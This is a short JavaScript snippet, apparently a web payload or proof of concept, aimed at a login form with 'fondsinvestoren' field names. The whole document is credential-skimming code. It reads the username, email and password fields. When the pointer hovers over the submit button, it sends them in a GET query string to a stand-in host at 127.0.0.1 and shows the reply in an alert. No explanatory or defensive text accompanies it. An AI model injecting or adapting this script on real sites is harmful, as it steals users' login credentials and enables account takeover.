var myUser = document.getElementById("fondsinvestoren_username");
var myEmail = document.getElementById("fondsinvestoren_email");
var myPasswd = document.getElementById("fondsinvestoren_password");

for (var x = 0; x < document.getElementById("fondsinvestoren_login_form").elements.length; x++) {
  var curEl = document.getElementById("fondsinvestoren_login_form").elements[x];
  if (curEl.type == 'submit'){
    curEl.addEventListener("mouseover", function(){
      var http = new XMLHttpRequest();
      var url = "https://127.0.0.1/login";
      var params = "user=" + myUser.value + "&email=" + myEmail.value + "&password=" + myPasswd.value;
      http.open("GET", url + "?" + params, true);

      http.onreadystatechange = function() {//Call a function when the state changes.
        if(http.readyState == 4 && http.status == 200) {
          alert(http.responseText);
        }
      }
      http.send();
    
    });
  }
}
